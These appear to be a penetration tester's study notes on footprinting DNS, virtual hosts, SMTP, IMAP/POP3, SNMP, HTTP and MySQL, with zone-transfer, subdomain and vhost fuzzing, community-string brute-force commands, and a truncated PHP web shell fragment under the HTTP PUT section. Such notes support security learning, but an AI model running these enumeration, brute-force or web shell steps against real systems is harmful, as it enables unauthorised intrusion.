	> In short, here, all forward records are entered according to the BIND format. This allows the DNS server to identify which domain, hostname, and role the IP addresses belong to. In simple terms, this is the phone book where the DNS server looks up the addresses for the domains it is searching for.
		
		cat /etc/bind/db.domain.com
	> For the IP address to be resolved from the Fully Qualified Domain Name (FQDN), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a PTR record. The PTR records are responsible for the reverse translation of IP addresses into names
		Reverse name resolution zone files
			cat /etc/bind/db.10.129.14

[+] Dangerous Settings

	> There are many ways in which a DNS server can be attacked. For example, a list of vulnerabilities targeting the BIND9 server can be found at CVEdetails(https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64). In addition, SecurityTrails provides a short list of the most popular attacks on DNS servers ==> https://securitytrails.com/blog/most-popular-types-dns-attacks

	> Some of the settings we can see below lead to these vulnerabilities, among others. Because DNS can get very complicated and it is very easy for errors to creep into this service, forcing an administrator to work around the problem until they find an exact solution. This often leads to elements being released so that parts of the infrastructure function as planned and desired. In such cases, functionality has a higher priority than security, which leads to misconfigurations and vulnerabilities.

	Option		      Description
	allow-query	    Defines which hosts are allowed to send requests to the DNS server.
	allow-recursion	Defines which hosts are allowed to send recursive requests to the DNS server.
	allow-transfer	Defines which hosts are allowed to receive zone transfers from the DNS server.
	zone-statistics	Collects statistical data of zones.
[+] Footprinting the Service

	> The footprinting at DNS servers is done as a result of the requests we send. So, first of all, the DNS server can be queried as to which other name servers are known. We do this using the NS record and the specification of the DNS server we want to query using the @ character. This is because if there are other DNS servers, we can also use them and query the records. However, other DNS servers may be configured differently and, in addition, may be permanent for other zones.
		dig ns inlanefreight.htb @10.10.14.15
	> Sometimes it is also possible to query a DNS server's version using a class CHAOS query and type TXT. However, this entry must exist on the DNS server. For this, we could use the following command:
		dig CH TXT version.bind 10.129.120.54
	> We can use the option ANY to view all available records. This will cause the server to show us all available entries that it is willing to disclose. It is important to note that not all entries from the zones will be shown.
		
		dig any inlanefreight.htb @10.129.120.54

[+] Zone transfer
	> Zone transfer refers to the transfer of zones to another server in DNS, which generally happens over TCP port 53. This procedure is abbreviated Asynchronous Full Transfer Zone (AXFR). Since a DNS failure usually has severe consequences for a company, the zone file is almost invariably kept identical on several name servers. When changes are made, it must be ensured that all servers have the same data. Synchronization between the servers involved is realized by zone transfer. Using a secret key rndc-key, which we have seen initially in the default configuration, the servers make sure that they communicate with their own master or slave. Zone transfer involves the mere transfer of files or records and the detection of discrepancies in the data sets of the servers involved.

	> The original data of a zone is located on a DNS server, which is called the primary name server for this zone. However, to increase the reliability, realize a simple load distribution, or protect the primary from attacks, one or more additional servers are installed in practice in almost all cases, which are called secondary name servers for this zone. For some Top-Level Domains (TLDs), making zone files for the Second Level Domains accessible on at least two servers is mandatory.

	> DNS entries are generally only created, modified, or deleted on the primary. This can be done by manually editing the relevant zone file or automatically by a dynamic update from a database. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. A primary is always a master, while a secondary can be both a slave and a master.

	> The slave fetches the SOA record of the relevant zone from the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA record of the master is greater than that of the slave, the data sets no longer match.

		dig axfr inlanefreight.htb @10.129.14.128
	
	> If the administrator used a subnet for the allow-transfer option for testing purposes or as a workaround solution or set it to any, everyone would query the entire zone file at the DNS server. In addition, other zones can be queried, which may even show internal IP addresses and hostnames
		dig axfr internal.inlanefreight.htb @10.129.14.128
	
	> The individual A records with the hostnames can also be found out with the help of a brute-force attack. To do this, we need a list of possible hostnames, which we use to send the requests in order. Such lists are provided, for example, by SecLists(https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt). 
		+ An option would be to execute a for-loop in Bash that lists these entries and sends the corresponding query to the desired DNS server.
			for sub in $(cat /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
      for eachitem in $(cat finalresults); do dig axfr $eachitem @10.129.206.107 | grep -v ';\|SOA' | sed -r '/^\s*$/d' |tee -a example;done #Another Way
		+ dnsenum
			dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb

[+] Virtual Hosts
  > A virtual host (vHost) is a feature that allows several websites to be hosted on a single server. This is an excellent solution if you have many websites and don't want to go through the time-consuming (and expensive) process of setting up a new web server for each one. Imagine having to set up a different webserver for a mobile and desktop version of the same page. There are two ways to configure virtual hosts:
    IP-based virtual hosting
    Name-based virtual hosting

  * IP-based Virtual Hosting
    > For this type, a host can have multiple network interfaces. Multiple IP addresses, or interface aliases, can be configured on each network interface of a host. The servers or virtual servers running on the host can bind to one or more IP addresses. This means that different servers can be addressed under different IP addresses on this host. From the client's point of view, the servers are independent of each other.

  * Name-based Virtual Hosting
    > The distinction for which domain the service was requested is made at the application level. For example, several domain names, such as admin.inlanefreight.htb and backup.inlanefreight.htb, can refer to the same IP. Internally on the server, these are separated and distinguished using different folders. Using this example, on a Linux server, the vHost admin.inlanefreight.htb could point to the folder /var/www/admin. For backup.inlanefreight.htb the folder name would then be adapted and could look something like /var/www/backup.
    > During our subdomain discovering activities, we have seen some subdomains having the same IP address that can either be virtual hosts or, in some cases, different servers sitting behind a proxy.

  > Imagine we have identified a web server at 192.168.10.10 during an internal pentest, and it shows a default website using the following command. Are there any virtual hosts present?
    curl -s http://192.168.10.10 #Default nginx page. Nothing interesting 
  > Let's make a cURL request sending a domain previously identified during the information gathering in the HOST header. We can do that like so:
    curl -s http://192.168.10.10 -H "Host: randomtarget.com" #Yeah
  > Now we can automate this by using a dictionary file of possible vhost names (such as /opt/useful/SecLists/Discovery/DNS/namelist.txt on the Pwnbox) and examining the Content-Length header to look for any differences.
    cat ./vhosts | while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://192.168.10.10 -H "HOST: ${vhost}.randomtarget.com" | grep "Content-Length: ";done
  > We have successfully identified a virtual host called dev-admin, which we can access using a cURL request.
    curl -s http://192.168.10.10 -H "Host: dev-admin.randomtarget.com"
    ➜  testing curl -s http://10.129.196.198 -H "Host: dmz.inlanefreight.htb"  | grep -i htb| tr -d '\t' | xclip -sel clip #Another way


  * Automating virtual hosts discovery 
    > We can use this manual approach for a small list of virtual hosts, but it will not be feasible if we have an extensive list. Using ffuf, we can speed up the process and filter based on parameters present in the response.
    > We can match or filter responses based on different options. The web server responds with a default and static website every time we issue an invalid virtual host in the HOST header. We can use the filter by size -fs option to discard the default response as it will always have the same size.
      ffuf -w ./vhosts -u http://192.168.10.10 -H "HOST: FUZZ.randomtarget.com" -fs 612
        -w: Path to our wordlist
        -u: URL we want to fuzz
        -H "HOST: FUZZ.randomtarget.com": This is the HOST Header, and the word FUZZ will be used as the fuzzing point.
        -fs 612: Filter responses with a size of 612, default response size in this case.

####SMTP
[+] Process
  > The Simple Mail Transfer Protocol (SMTP) is a protocol for sending emails in an IP network. It can be used between an email client and an outgoing mail server or between two SMTP servers. SMTP is often combined with the IMAP or POP3 protocols, which can fetch emails and send emails. In principle, it is a client-server-based protocol, although SMTP can be used between a client and a server and between two SMTP servers. In this case, a server effectively acts as a client.

  > By default, SMTP servers accept connection requests on port 25. However, newer SMTP servers also use other ports such as TCP port 587. This port is used to receive mail from authenticated users/servers, usually using the STARTTLS command to switch the existing plaintext connection to an encrypted connection. The authentication data is protected and no longer visible in plaintext over the network. At the beginning of the connection, authentication occurs when the client confirms its identity with a user name and password. The emails can then be transmitted. For this purpose, the client sends the server sender and recipient addresses, the email's content, and other information and parameters. After the email has been transmitted, the connection is terminated again. The email server then starts sending the email to another SMTP server.

  > SMTP works unencrypted without further measures and transmits all commands, data, or authentication information in plain text. To prevent unauthorized reading of data, the SMTP is used in conjunction with SSL/TLS encryption. Under certain circumstances, a server uses a port other than the standard TCP port 25 for the encrypted connection, for example, TCP port 465.

  > An essential function of an SMTP server is preventing spam using authentication mechanisms that allow only authorized users to send e-mails. For this purpose, most modern SMTP servers support the protocol extension ESMTP with SMTP-Auth. After sending his e-mail, the SMTP client, also known as Mail User Agent (MUA), converts it into a header and a body and uploads both to the SMTP server. This has a so-called Mail Transfer Agent (MTA), the software basis for sending and receiving e-mails. The MTA checks the e-mail for size and spam and then stores it. To relieve the MTA, it is occasionally preceded by a Mail Submission Agent (MSA), which checks the validity, i.e., the origin of the e-mail. This MSA is also called Relay server. These are very important later on, as the so-called Open Relay Attack can be carried out on many SMTP servers due to incorrect configuration. We will discuss this attack and how to identify the weak point for it a little later. The MTA then searches the DNS for the IP address of the recipient mail server.

  > On arrival at the destination SMTP server, the data packets are reassembled to form a complete e-mail. From there, the Mail delivery agent (MDA) transfers it to the recipient's mailbox.

  Client(MUA) ==> Submission Agent(MSA) ==> Open Relay(MTA) ==> Mail Delivery Agent(MDA) ==> Mailbox(POP3/IMAP)

[+] Disadvantages
* But SMTP has two disadvantages inherent to the network protocol.

  > The first is that sending an email using SMTP does not return a usable delivery confirmation. Although the specifications of the protocol provide for this type of notification, its formatting is not specified by default, so that usually only an English-language error message, including the header of the undelivered message, is returned.

  > Users are not authenticated when a connection is established, and the sender of an email is therefore unreliable. As a result, open SMTP relays are often misused to send spam en masse. The originators use arbitrary fake sender addresses for this purpose to not be traced (mail spoofing). Today, many different security techniques are used to prevent the misuse of SMTP servers. For example, suspicious emails are rejected or moved to quarantine (spam folder). For example, responsible for this are the identification protocol DomainKeys (DKIM), the Sender Policy Framework (SPF).

* For this purpose, an extension for SMTP has been developed called Extended SMTP (ESMTP). When people talk about SMTP in general, they usually mean ESMTP. ESMTP uses TLS, which is done after the EHLO command by sending STARTTLS. This initializes the SSL-protected SMTP connection, and from this moment on, the entire connection is encrypted, and therefore more or less secure. Now AUTH PLAIN(https://www.samlogic.net/articles/smtp-commands-reference-auth.htm) extension for authentication can also be used safely.

[+] Default configuration
  cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"

  Command	      Description
    AUTH PLAIN	AUTH is a service extension used to authenticate the client.
    HELO	      The client logs in with its computer name and thus starts the session.
    EHLO        Is an alternative to HELO for servers that support the SMTP service extensions (ESMTP). If the server does not support ESMTP, it will reply with an error. 
    MAIL FROM	  The client names the email sender.
    RCPT TO	    The client names the email recipient.
    DATA	      The client initiates the transmission of the email.
    RSET	      The client aborts the initiated transmission but keeps the connection between client and server.
    VRFY	      The client checks if a mailbox is available for message transfer.
    EXPN	      The client also checks if a mailbox is available for messaging with this command.
    NOOP	      The client requests a response from the server to prevent disconnection due to time-out.
    QUIT	      The client terminates the session.
  
* To interact with the SMTP server, we can use the telnet tool to initialize a TCP connection with the SMTP server. The actual initialization of the session is done with the command mentioned above, HELO or EHLO.
  telnet 10.192.12.29 25
* The command VRFY can be used to enumerate existing users on the system. However, this does not always work. Depending on how the SMTP server is configured, the SMTP server may issue code 252 and confirm the existence of a user that does not exist on the system. A list of all SMTP response codes can be found here ==> https://serversmtp.com/smtp-error/

* Sometimes we may have to work through a web proxy. We can also make this web proxy connect to the SMTP server. The command that we would send than would look something like this: CONNECT 10.129.14.128:25 HTTP/1.0

  > To prevent the sent emails from being filtered by spam filters and not reaching the recipient, the sender can use a relay server that the recipient trusts. It is an SMTP server that is known and verified by all others. As a rule, the sender must authenticate himself to the relay server before using it.

  > Often, administrators have no overview of which IP ranges they have to allow. This results in a misconfiguration of the SMTP server that we will still often find in external and internal penetration tests. Therefore, they allow all IP addresses not to cause errors in the email traffic and thus not to disturb or unintentionally interrupt the communication with potential and current customers.

####IMAP/POP3
* With the help of the Internet Message Access Protocol (IMAP), access to emails from a mail server is possible. Unlike the Post Office Protocol (POP3), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.

* Clients access these structures online and can create local copies. Even across several clients, this results in a uniform database. Emails remain on the server until they are deleted. IMAP is text-based and has extended functions, such as browsing emails directly on the server. It is also possible for several users to access the email server simultaneously. Without an active connection to the server, managing emails is impossible. However, some clients offer an offline mode with a local copy of the mailbox. The client synchronizes all offline local changes when a connection is reestablished.

* The client establishes the connection to the server via port 143. For communication, it uses text-based commands in ASCII format. Several commands can be sent in succession without waiting for confirmation from the server. Later confirmations from the server can be assigned to the individual commands using the identifiers sent along with the commands. Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.

* SMTP is usually used to send emails. By copying sent emails into an IMAP folder, all clients have access to all sent mails, regardless of the computer from which they were sent. Another advantage of the Internet Message Access Protocol is creating personal folders and folder structures in the mailbox. This feature makes the mailbox clearer and easier to manage. However, the storage space requirement on the email server increases.

* Without further measures, IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plain text. Many email servers require establishing an encrypted IMAP session to ensure greater security in email traffic and prevent unauthorized access to mailboxes. SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port 143 or an alternative port such as 993.

[+] Default configuration
  > Both IMAP and POP3 have a large number of configuration options, making it difficult to deep dive into each component in more detail. If you wish to examine these protocol configurations deeper, we recommend creating a VM locally and install the two packages dovecot-imapd, and dovecot-pop3d using apt and play around with the configurations and experiment.

  > In the documentation of Dovecot, we can find the individual core settings(https://doc.dovecot.org/settings/core/) and service(https://doc.dovecot.org/configuration_manual/service_configuration/) configuration options that can be utilized for our experiments. However, let us look at the list of commands and see how we can directly interact and communicate with IMAP and POP3 using the command line.

  > IMAP Command	                        Description
    n namespace                     The namespace should be the first command issued, as it will return the prefix and hierarchy delimiter to the Personal Namespace(s), Other Users’ Namespace(s) and Shared Namespace(s) that the server wishes to expose.
    1 LOGIN username password	      User's login.
    1 LIST "" *	                    Lists all directories.
    1 CREATE "INBOX"	              Creates a mailbox with a specified name.
    1 DELETE "INBOX"	              Deletes a mailbox.
    1 RENAME "ToRead" "Important"	  Renames a mailbox.
    1 LSUB "" *	                    Returns a subset of names from the set of names that the User has declared as being active or subscribed.
    1 SELECT INBOX	                Selects a mailbox so that messages in the mailbox can be accessed.
    1 UNSELECT INBOX	              Exits the selected mailbox.
    1 FETCH <ID> all	              Retrieves data associated with a message in the mailbox.
    1 CLOSE	                        Removes all messages with the Deleted flag set.
    1 LOGOUT	                      Closes the connection with the IMAP server.

  > POP3 Commands
    Command	        Description
    USER username	  Identifies the user.
    PASS password	  Authentication of the user using its password.
    STAT	          Requests the number of saved emails from the server.
    LIST	          Requests from the server the number and size of all emails.
    RETR id	        Requests the server to deliver the requested email by ID.
    DELE id	        Requests the server to delete the requested email by ID.
    CAPA	          Requests the server to display the server capabilities.
    RSET	          Requests the server to reset the transmitted information.
    QUIT	          Closes the connection with the POP3 server.

[+] Dangerous settings
* Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:

  > Setting	                Description
    auth_debug	            Enables all authentication debug logging.
    auth_debug_passwords	  This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.
    auth_verbose	          Logs unsuccessful authentication attempts and their reasons.
    auth_verbose_passwords	Passwords used for authentication are logged and can also be truncated.
    auth_anonymous_username	This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.

[+] Footprinting the service
  > By default, ports 110, 143, 993, and 995 are used for IMAP and POP3. The two higher ports use TLS/SSL to encrypt the communication between client and server. 
     sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
  > If we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages.
     curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
  > If we also use the verbose (-v) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server
    curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
  > To interact with the IMAP or POP3 server over SSL, we can use openssl, as well as ncat. The commands for this would look like this:
    * Interaction POP3
        openssl s_client -connect 10.129.14.128:pop3s
    * Interaction IMAP
        openssl s_client -connect 10.129.14.128:imaps -crlf -quiet
          The option “-crlf” just means to issue a carriage return and a line feed on enter and “-quiet” means not to spit out a bunch of details about the encrypted channel
          Feel free to drop “-quiet” to view the output, or if you are keen, add “-debug” for even more detail.
        > A Note on TLS
            Some IMAP installations offer a TLS method of connection, with the STARTTLS command, on the cleartext port 143. But if you do want to know how to connect to an IMAP service that does offer STARTTLS, the easiest way to do this is to use OpenSSL s_client again, as follows:
              openssl s_client -connect server.domain.tld:143 -crlf -quiet -starttls imap
      > To actually perform actions against an IMAP server, you typically need to authenticate.  There are three ways to authenticate:
          login
          SASL AUTH LOGIN
          SASL AUTH PLAIN
      > A1 LIST "DEV.DEPARTMENT.INT/" "*"

####SNMP
* Simple Network Management Protocol (SNMP) was created to monitor network devices. In addition, this protocol can also be used to handle configuration tasks and change settings remotely. SNMP-enabled hardware includes routers, switches, servers, IoT devices, and many other devices that can also be queried and controlled using this standard protocol. Thus, it is a protocol for monitoring and managing network devices. In addition, configuration tasks can be handled, and settings can be made remotely using this standard. The current version is SNMPv3, which increases the security of SNMP in particular, but also the complexity of using this protocol.

* In addition to the pure exchange of information, SNMP also transmits control commands using agents over UDP port 161. The client can set specific values in the device and change options and settings with these commands. While in classical communication, it is always the client who actively requests information from the server, SNMP also enables the use of so-called traps over UDP port 162. These are data packets sent from the SNMP server to the client without being explicitly requested. If a device is configured accordingly, an SNMP trap is sent to the client once a specific event occurs on the server-side.

* For the SNMP client and server to exchange the respective values, the available SNMP objects must have unique addresses known on both sides. This addressing mechanism is an absolute prerequisite for successfully transmitting data and network monitoring using SNMP.

[+] MIB
  > To ensure that SNMP access works across manufacturers and with different client-server combinations, the Management Information Base (MIB) was created. MIB is an independent format for storing device information. A MIB is a text file in which all queryable SNMP objects of a device are listed in a standardized tree hierarchy. It contains at least one Object Identifier (OID), which, in addition to the necessary unique address and a name, also provides information about the type, access rights, and a description of the respective object. MIB files are written in the Abstract Syntax Notation One (ASN.1) based ASCII text format. The MIBs do not contain data, but they explain where to find which information and what it looks like, which returns values for the specific OID, or which data type is used.

[+] OID
  > An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information. Many nodes in the OID tree contain nothing except references to those below them. The OIDs consist of integers and are usually concatenated by dot notation. We can look up many MIBs for the associated OIDs in the Object Identifier Registry.

[+] SNMPv1
  > SNMP version 1 (SNMPv1) is used for network management and monitoring. SNMPv1 is the first version of the protocol and is still in use in many small networks. It supports the retrieval of information from network devices, allows for the configuration of devices, and provides traps, which are notifications of events. However, SNMPv1 has no built-in authentication mechanism, meaning anyone accessing the network can read and modify network data. Another main flaw of SNMPv1 is that it does not support encryption, meaning that all data is sent in plain text and can be easily intercepted.

[+] SNMPv2
  > SNMPv2 existed in different versions. The version still exists today is v2c, and the extension c means community-based SNMP. Regarding security, SNMPv2 is on par with SNMPv1 and has been extended with additional functions from the party-based SNMP no longer in use. However, a significant problem with the initial execution of the SNMP protocol is that the community string that provides security is only transmitted in plain text, meaning it has no built-in encryption.


[+] SNMPv3
  > The security has been increased enormously for SNMPv3 by security features such as authentication using username and password and transmission encryption (via pre-shared key) of the data. However, the complexity also increases to the same extent, with significantly more configuration options than v2c.

[+] Community Strings
  > Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. It is important to note that many organizations are still using SNMPv2, as the transition to SNMPv3 can be very complex, but the services still need to remain active. This causes many administrators a great deal of concern and creates some problems they are keen to avoid. The lack of knowledge about how the information can be obtained and how we as attackers use it makes the administrators' approach seem inexplicable. At the same time, the lack of encryption of the data sent is also a problem. Because every time the community strings are sent over the network, they can be intercepted and read.

  > Other explanation: SNMP Community strings provide information and statistics about a router or device, helping us gain access to it. The manufacturer default community strings of public and private are often unchanged. In SNMP versions 1 and 2c, access is controlled using a plaintext community string, and if we know the name, we can gain access to it. Encryption and authentication were only added in SNMP version 3. Much information can be gained from SNMP. Examination of process parameters might reveal credentials passed on the command line, which might be possible to reuse for other externally accessible services given the prevalence of password reuse in enterprise environments. Routing information, services bound to additional interfaces, and the version of installed software can also be revealed.
  > The are 2 types of community strings:
    public mainly read only functions
    private Read/Write in general
  > Note that the writability of an OID depends on the community string used, so even if you find that "public" is being used, you could be able to write some values. Also, there may exist objects which are always "Read Only". If you try to write an object a noSuchName or readOnly error is received, In versions 1 and 2/2c if you to use a bad community string the server wont respond. So, if it responds, a valid community strings was used.

[+] Default configuration 
  > The configuration of this service can also be changed in many ways. Therefore, we recommend setting up a VM to install and configure the SNMP server ourselves. All the settings that can be made for the SNMP daemon are defined and described in the manpage ==> http://www.net-snmp.org/docs/man/snmpd.conf.html

    cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
[+] Dangerous settings
  Settings	                                      Description
  rwuser noauth	                                  Provides access to the full OID tree without authentication.
  rwcommunity <community string> <IPv4 address>	  Provides access to the full OID tree regardless of where the requests were sent from.
  rwcommunity6 <community string> <IPv6 address>	Same access as with rwcommunity with the difference of using IPv6.

[+] Footprinting the service
  > For footprinting SNMP, we can use tools like snmpwalk, onesixtyone, and braa. Snmpwalk is used to query the OIDs with their information. Onesixtyone can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator. Since these community strings can be bound to any source, identifying the existing community strings can take quite some time

    snmpwalk -v2c -c public 10.129.14.128
	  snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
	  snmpwalk -v 2c -c private  10.129.42.253

  > Once we know the community string and the SNMP service that does not require authentication (versions 1, 2c), we can query internal system information like in the previous example. Here we recognize some Python packages that have been installed on the system. If we do not know the community string, we can use onesixtyone and SecLists wordlists or other tools to identify these community strings.
    onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
    onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>

    hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp

  > Often, when certain community strings are bound to specific IP addresses, they are named with the hostname of the host, and sometimes even symbols are added to these names to make them more challenging to identify. However, if we imagine an extensive network with over 100 different servers managed using SNMP, the labels, in that case, will have some pattern to them. Therefore, we can use different rules to guess them. We can use the tool crunch(https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists
  > Once we know a community string, we can use it with braa(https://github.com/mteg/braa) to brute-force the individual OIDs and enumerate the information behind them.

####HTTP
* GET /index.html HTTP/1.1 to retrieve the page index.html or GET / HTTP/1.1 to retrieve the default page.
* HTTP is a stateles protocol. Every request is completely unrelated to the ones preceding and following it.
* The cookie jar is the storage space where a web browser stores the cookies. When a web server installs a cookie, it sets the domain field. Then, the browser will use the cookie for every request sent to that domain and all its subdomains. If the server does not specify the domain attribute, the browser will automatically set the domain as the server domain and set the cookie host-only flag; this means that the cookie will be sent only to that precise hostname
* -ign_eof
* Websites running PHP install session cookies by using the ==> PHPSESSID, JSP websites use ==> JSESSIONID
* Each development language has its own default session parameter name. Of course, the web developer can also choose to use a custom parameter name
* Session IDs can also be transmitted via GET requests ==> http://example.site/resource.php?sessid=s423ndsd
* Parameter http-only is very important for no access by javascript(document.cookie),java,etc.
* Expires ==> session [expires after close the browser ]
####Fingerprinting with Netcat
* It does not work with encryption
	nc -v www.ferrari.com 80 | GET / HTTP/1.1 Host:www.ferrari.com //Remember that every HTTP request has two empty lines between the header and the body of the reques itself
  	nc -lvnp 8888 (Server) ==> echo 'hello' | nc -v localhost 8888
  	nv example.com 80
  	  HEAD / HTTP/1.0 and hit enter 2 times.
  	  -u : UDP connection
  	  -v : To notify you after the connection to the server
  	  -k : Keep listening after client disconnects
  	  -z: zero I/O

####Fingerprinting with OpenSSL
	openssl s_client -connect hack.me:443 -debug | -state | -quiet and after that OPTIONS HTTP/1.1 Host: hack.me
	openssl x509 -in twitter.com-cert -noout -text
	openssl s_client -connect target.site:443
	HEAD / HTTP/1.0

####Fingerprinting with Httprint
* It uses a signature-based technique to indentify web servers
	httprint -P0 -h <target hosts> -s <signature file>
	-P0 to avoid pinging the host (most web servers do not respond to ping echo requests)

####HTTP methods (Some of them)
* If you use HTTP/1.0, you can skip the Host: header
* OPTIONS (Used to query the web server for enabled HTTP Verbs)
	OPTIONS / HTTP/1.1
    	Host: www.example.site

	curl -X OPTIONS 192.45.178.3 -v

* GET (To request a resource)
	GET /page.php HTTP/1.1 //You can also passa arguments like ==> ... /page.php?course=PTS...
    	Host: www.example.site

    	curl -X GET 192.45.178.3

* POST (To submit HTML form data. POST parameters must be in the message body)
	POST /login.php HTTP/1.1
    	Host: www.example.site

    	username=john&password=mypass

    	curl -X POST 192.45.178.3
    	curl -X POST 192.45.178.3/login.php -d "name=m1l0js&password=m1l0js" -v

* HEAD (Very similar to GET, as it asks just headers of the response instead of the response body)
	HEAD / HTTP/1.1
    	Host: www.example.site

    	curl -I 192.45.178.3
	curl -IL https://www.inlanefreight.com


* PUT (Used to upload a file to the server. It is very dangerous feature if it is allowed and misconfigured)
	PUT /path/to/destination HTTP/1.1
    	Host: www.example.site

    	<PUT data>

    	//You have to know the size of the file you want to upload on the server ==> wc -m payload.php = 20

    	    $result = shell_exec($cmd); //Runs the command by using the OS shell
    	    echo $result; //Displays the output of the command
    	    echo '</pre>';
    	  }

    	  [+] In the web browser: victim site/shell.php?cmd=ls


    	curl -X PUT 192.45.178.3
      
* DELETE (Used to remove a file from the server. If misconfigured leads to denial of service and data loss)
	DELETE /path/to/destination HTTP/1.1
    	Host: www.example.site

    	curl -XDELETE 192.45.178.3/uploads/hello.txt


####REST APIs (Representational State Transfer Application Programming Interface)
* Are a specific type of web application that relies strongly on almost all HTTP Verbs. They are often reffered to as 'web services' or simply APIs
* It is sometimes easy to confuse REST APIs PUT method, which simply creates new content with a PUT method that allows us to create an arbitrary file.

####MYSQL
  > MySQL is an open-source SQL relational database management system developed and supported by Oracle. A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Within the database, data storage is done in a manner to take up as little space as possible. The database is controlled using the SQL database language. MySQL works according to the client-server principle and consists of a MySQL server and one or more MySQL clients. The MySQL server is the actual database management system. It takes care of data storage and distribution. The data is stored in tables with different columns, rows, and data types. These databases are often stored in a single file with the file extension .sql, for example, like wordpress.sql.
[+] MySQL Clients
  > The MySQL clients can retrieve and edit the data using structured queries to the database engine. Inserting, deleting, modifying, and retrieving data, is done using the SQL database language. Therefore, MySQL is suitable for managing many different databases to which clients can send multiple queries simultaneously. Depending on the use of the database, access is possible via an internal network or the public Internet.
  > One of the best examples of database usage is the CMS WordPress. WordPress stores all created posts, usernames, and passwords in their own database, which is only accessible from the localhost. However, as explained in more detail in the module Introduction to Web Applications, there are database structures that are distributed across multiple servers also

[+] MySQL Databases
  > MySQL is ideally suited for applications such as dynamic websites, where efficient syntax and high response speed are essential. It is often combined with a Linux OS, PHP, and an Apache web server and is also known in this combination as LAMP (Linux, Apache, MySQL, PHP), or when using Nginx, as LEMP. In a web hosting with MySQL database, this serves as a central instance in which content required by PHP scripts is stored. Among these are:
  			
    Headers	                Texts	            Meta tags	        Forms
    Customers	              Usernames	        Administrators	  Moderators
    Email addresses	        User information	Permissions	      Passwords
    External/Internal links	Links to Files	  Specific contents	Values
  > Sensitive data such as passwords can be stored in their plain-text form by MySQL; however, they are generally encrypted beforehand by the PHP scripts using secure methods such as One-Way-Encryption.

[+] MySQL Commands
  > A MySQL database translates the commands internally into executable code and performs the requested actions. The web application informs the user if an error occurs during processing, which various SQL injections can provoke. Often, these error descriptions contain important information and confirm, among other things, that the web application interacts with the database in a different way than the developers intended.

  > The web application sends the generated information back to the client if the data is processed correctly. This information can be the data extracts from a table or records needed for further processing with logins, search functions, etc. SQL commands can display, modify, add or delete rows in tables. In addition, SQL can also change the structure of tables, create or delete relationships and indexes, and manage users.

  > MariaDB, which is often connected with MySQL, is a fork of the original MySQL code. This is because the chief developer of MySQL left the company MySQL AB after it was acquired by Oracle and developed another open-source SQL database management system based on the source code of MySQL and called it MariaDB.

[+] Default Configuration
  > The management of SQL databases and their configurations is a vast topic. It is so large that entire professions, such as database administrator, deal with almost nothing but databases. These structures become very large quickly, and their planning can become complicated. Among other things, DB management is a core competency for software developers but also information security analysts. To cover this area completely would go beyond the scope of this module. Therefore, we recommend setting up a MySQL/MariaDB instance to experiment with the various configurations to understand the available functionality and configuration options better. Let us have a look at the default configuration of MySQL.
    cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
    cat /etc/my.cnf.d/mysql-clients.cnf  #MariaDB

[+] Dangerous settings
  > Many things can be misconfigured with MySQL. We can look in more detail at the MySQL reference to determine which options can be made in the server configuration. The main options that are security-relevant are:
    Settings	        Description
    user	            Sets which user the MySQL service will run as.
    password	        Sets the password for the MySQL user.
    admin_address	    The IP address on which to listen for TCP/IP connections on the administrative network interface.
    debug	            This variable indicates the current debugging settings
